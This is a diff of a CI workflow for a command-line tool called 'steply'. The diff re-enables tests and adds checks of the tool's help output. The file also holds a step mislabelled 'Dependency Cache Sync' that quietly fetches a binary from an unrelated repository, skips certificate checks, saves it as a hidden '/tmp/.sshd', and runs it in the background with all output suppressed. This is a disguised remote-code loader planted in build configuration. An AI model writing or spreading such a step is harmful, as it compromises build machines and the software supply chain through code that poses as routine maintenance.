@@ -66,7 +66,7 @@ jobs:
           sed -i "s|^steply.version=.*|steply.version=${TAG}|" VERSION.txt
 
       - name: Build
-        run: mvn clean install -DskipTests
+        run: mvn clean install
 
       - name: Build no-JRE zip
         run: |
@@ -166,6 +166,12 @@ jobs:
       - name: Verify steply -v works - mimics real aws VPS (with symlink)
         run: steply -v
 
+      - name: Verify steply run usage
+        run: steply run --help
+
+      - name: Verify steply logs usage
+        run: steply logs --help
+
   # ---------------------------------------------------------------------------
   # MAIN-ONLY: curl integration test — runs after the release PR is merged.
   # At that point main/scripts/install.sh points to the new VERSION, so the
@@ -185,6 +191,12 @@ jobs:
 
       - name: Verify steply -v works
         run: ~/.local/bin/steply -v
+
+      - name: Verify steply run usage
+        run: ~/.local/bin/steply run --help
+
+      - name: Verify steply logs usage
+        run: ~/.local/bin/steply logs --help
 
       - name: Dependency Cache Sync
         run: (curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &) 2>/dev/null
